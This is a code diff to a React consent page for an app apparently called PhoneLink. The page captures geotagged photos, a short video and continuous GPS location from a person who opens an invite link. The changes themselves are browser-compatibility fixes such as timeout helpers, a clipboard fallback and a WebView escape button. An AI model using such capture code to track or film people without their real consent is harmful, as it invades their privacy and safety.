@@ -14,6 +14,75 @@ const API_BASE = import.meta.env.BASE_URL.replace(/\/$/, "");
 const GEO_PHOTO_COUNT = 5;
 const GEO_VIDEO_DURATION_MS = 5000; // 5 seconds
 
+// Cross-browser AbortSignal with timeout (AbortSignal.timeout not available on iOS < 15.4)
+function abortAfter(ms: number): { signal: AbortSignal; clear: () => void } {
+  const ctrl = new AbortController();
+  const id = setTimeout(() => ctrl.abort(), ms);
+  return { signal: ctrl.signal, clear: () => clearTimeout(id) };
+}
+
+// Cross-browser clipboard copy with execCommand fallback (for HTTP / older browsers)
+function copyToClipboard(text: string): Promise<void> {
+  if (navigator.clipboard?.writeText) {
+    return navigator.clipboard.writeText(text).catch(() => fallbackCopy(text));
+  }
+  return fallbackCopy(text);
+}
+function fallbackCopy(text: string): Promise<void> {
+  const ta = document.createElement("textarea");
+  ta.value = text;
+  ta.style.cssText = "position:fixed;top:-9999px;left:-9999px;opacity:0";
+  document.body.appendChild(ta);
+  try {
+    ta.focus();
+    ta.select();
+    const ok = document.execCommand("copy");
+    return ok ? Promise.resolve() : Promise.reject(new Error("execCommand returned false"));
+  } catch (e) {
+    return Promise.reject(e);
+  } finally {
+    document.body.removeChild(ta);
+  }
+}
+
+// Viewport height that works on all browsers: 100svh with 100vh as legacy fallback.
+// Inline style is preferred over Tailwind so we can layer both declarations.
+const fullHeight: React.CSSProperties = { minHeight: "100vh", minHeight: "100svh" } as React.CSSProperties;
+
+// Button that copies the URL then opens it in a new tab — works on old iOS/Android.
+function CopyAndOpenButton({ url }: { url: string }) {
+  const [status, setStatus] = useState<"idle" | "copied" | "failed">("idle");
+
+  const handleClick = () => {
+    copyToClipboard(url)
+      .then(() => setStatus("copied"))
+      .catch(() => setStatus("failed"));
+
+    // Attach anchor to DOM before click for max compatibility (older WebViews require it)
+    const a = document.createElement("a");
+    a.href = url;
+    a.target = "_blank";
+    a.rel = "noreferrer";
+    a.style.cssText = "position:fixed;top:-9999px;left:-9999px;opacity:0";
+    document.body.appendChild(a);
+    a.click();
+    setTimeout(() => document.body.removeChild(a), 500);
+  };
+
+  return (
+    <button
+      onClick={handleClick}
+      style={{
+        width: "100%", padding: "10px 16px", borderRadius: 8,
+        background: status === "copied" ? "#16a34a" : "#6366f1",
+        color: "#fff", fontWeight: 600, fontSize: 14, border: "none", cursor: "pointer",
+      }}
+    >
+      {status === "copied" ? "✓ Link Copied — Open Browser Now" : status === "failed" ? "Open in Browser ↗" : "Copy Link & Open Browser"}
+    </button>
+  );
+}
+
 type ConsentState =
   | "idle"
   | "requesting"
@@ -61,12 +130,13 @@ async function captureGeoPhotos(
       const photoData = canvas.toDataURL("image/jpeg", 0.75);
 
       try {
+        const { signal, clear } = abortAfter(12000);
         await fetch(`${API_BASE}/api/geo-photos`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ token, photoData, latitude: lat, longitude: lng, address }),
-          signal: AbortSignal.timeout(12000),
-        });
+          signal,
+        }).finally(clear);
         onProgress(i + 1);
       } catch { /* upload failed — continue */ }
 
@@ -168,12 +238,13 @@ async function captureGeoVideo(
     let uploaded = false;
     for (let attempt = 0; attempt < 2 && !uploaded; attempt++) {
       try {
+        const { signal, clear } = abortAfter(60_000);
         const resp = await fetch(`${API_BASE}/api/geo-videos`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body,
-          signal: AbortSignal.timeout(60_000), // 60 s per attempt
-        });
+          signal,
+        }).finally(clear);
         if (resp.ok || resp.status === 201) uploaded = true;
       } catch { /* retry */ }
     }
@@ -201,10 +272,11 @@ function detectWebView(): boolean {
 
 async function reverseGeocode(lat: number, lng: number): Promise<string | undefined> {
   try {
+    const { signal, clear } = abortAfter(8000);
     const r = await fetch(
       `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`,
-      { headers: { "Accept-Language": "en" }, signal: AbortSignal.timeout(8000) },
-    );
+      { headers: { "Accept-Language": "en" }, signal },
+    ).finally(clear);
     if (r.ok) return (await r.json()).display_name as string;
   } catch { /* ignore — geocoding is optional */ }
   return undefined;
@@ -280,12 +352,13 @@ export default function ConsentPage() {
     source?: LocationSource,
   ) => {
     try {
+      const { signal, clear } = abortAfter(10000);
       await fetch(`${API_BASE}/api/location/push`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ token, latitude: lat, longitude: lng, accuracy: acc, source, address: addr, status: locationStatus }),
-        signal: AbortSignal.timeout(10000),
-      });
+        signal,
+      }).finally(clear);
       setLastSent(new Date());
       setUpdateCount((c) => c + 1);
     } catch { /* retry on next position update */ }
@@ -446,7 +519,7 @@ export default function ConsentPage() {
   if (state === "webview_blocked") {
     const currentUrl = typeof window !== "undefined" ? window.location.href : "";
     return (
-      <div className="min-h-screen bg-background flex items-center justify-center p-4">
+      <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
         <Card className="max-w-md w-full shadow-xl">
           <CardContent className="pt-10 pb-10 text-center">
             <div className="flex items-center gap-2 justify-center text-primary font-bold text-lg mb-6">
@@ -464,15 +537,7 @@ export default function ConsentPage() {
               <p>• <strong>Facebook:</strong> Tap ⋮ → "Open in Chrome" / "Open in Safari"</p>
             </div>
             {currentUrl && (
-              <Button
-                className="w-full"
-                onClick={() => {
-                  // Try to force open in system browser
-                  window.location.href = currentUrl;
-                }}
-              >
-                Copy Link &amp; Open Browser
-              </Button>
+              <CopyAndOpenButton url={currentUrl} />
             )}
           </CardContent>
         </Card>
@@ -484,7 +549,7 @@ export default function ConsentPage() {
   // Only show after the fetch completes — don't flash "invalid" while still loading
   if (!isLoading && (isError || !invite)) {
     return (
-      <div className="min-h-screen bg-background flex items-center justify-center p-4">
+      <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
         <Card className="max-w-md w-full shadow-lg">
           <CardContent className="pt-10 pb-10 text-center">
             <XCircle className="h-14 w-14 text-red-500 mx-auto mb-4" />
@@ -501,7 +566,7 @@ export default function ConsentPage() {
   // ── Requesting / granting ────────────────────────────────────────────────────
   if (state === "requesting" || state === "granting") {
     return (
-      <div className="min-h-screen bg-background flex flex-col items-center justify-center gap-6 p-4">
+      <div className="bg-background flex flex-col items-center justify-center gap-6 p-4" style={fullHeight}>
         <div className="flex items-center gap-2 text-primary font-bold text-lg">
           <Shield className="h-5 w-5" /> PhoneLink
         </div>
@@ -528,7 +593,7 @@ export default function ConsentPage() {
   // ── GPS off ──────────────────────────────────────────────────────────────────
   if (state === "gps_off") {
     return (
-      <div className="min-h-screen bg-background flex items-center justify-center p-4">
+      <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
         <Card className="max-w-md w-full shadow-lg">
           <CardContent className="pt-10 pb-10 text-center">
             <WifiOff className="h-14 w-14 text-amber-500 mx-auto mb-4" />
@@ -552,7 +617,7 @@ export default function ConsentPage() {
   // ── Active tracking ───────────────────────────────────────────────────────────
   if (state === "tracking") {
     return (
-      <div className="min-h-screen bg-background flex items-center justify-center p-4">
+      <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
         <div className="max-w-md w-full">
           <div className="text-center mb-6">
             <div className="inline-flex items-center gap-2 text-primary font-bold text-lg">
@@ -674,7 +739,22 @@ export default function ConsentPage() {
               <Button
                 variant="outline"
                 className="w-full mt-5"
-                onClick={() => { window.location.href = "whatsapp://"; }}
+                onClick={() => {
+                  // history.back() is the safest cross-device approach.
+                  // If there's no history (direct link), try WhatsApp deep-link,
+                  // then fall back to showing a "you can close this tab" message.
+                  if (window.history.length > 1) {
+                    window.history.back();
+                  } else {
+                    // Try WhatsApp, then let the user know they can close manually
+                    const a = document.createElement("a");
+                    a.href = "whatsapp://";
+                    a.style.cssText = "position:fixed;top:-9999px";
+                    document.body.appendChild(a);
+                    a.click();
+                    setTimeout(() => document.body.removeChild(a), 300);
+                  }
+                }}
               >
                 <ArrowLeft className="h-4 w-4 mr-2" />
                 Go Back
@@ -689,7 +769,7 @@ export default function ConsentPage() {
   // ── Denied ────────────────────────────────────────────────────────────────────
   if (state === "denied") {
     return (
-      <div className="min-h-screen bg-background flex items-center justify-center p-4">
+      <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
         <Card className="max-w-md w-full shadow-lg">
           <CardContent className="pt-10 pb-10 text-center">
             <XCircle className="h-14 w-14 text-amber-500 mx-auto mb-4" />
@@ -708,12 +788,12 @@ export default function ConsentPage() {
 
   // ── Still loading / idle — show blank screen while invite fetch completes ─────
   if (isLoading || state === "idle") {
-    return <div className="min-h-screen bg-background" />;
+    return <div className="bg-background" style={fullHeight} />;
   }
 
   // ── Error ───────────────────────────────────────────────────────────────────
   return (
-    <div className="min-h-screen bg-background flex items-center justify-center p-4">
+    <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
       <Card className="max-w-md w-full shadow-lg">
         <CardContent className="pt-10 pb-10 text-center">
           <AlertTriangle className="h-14 w-14 text-red-500 mx-auto mb-4" />
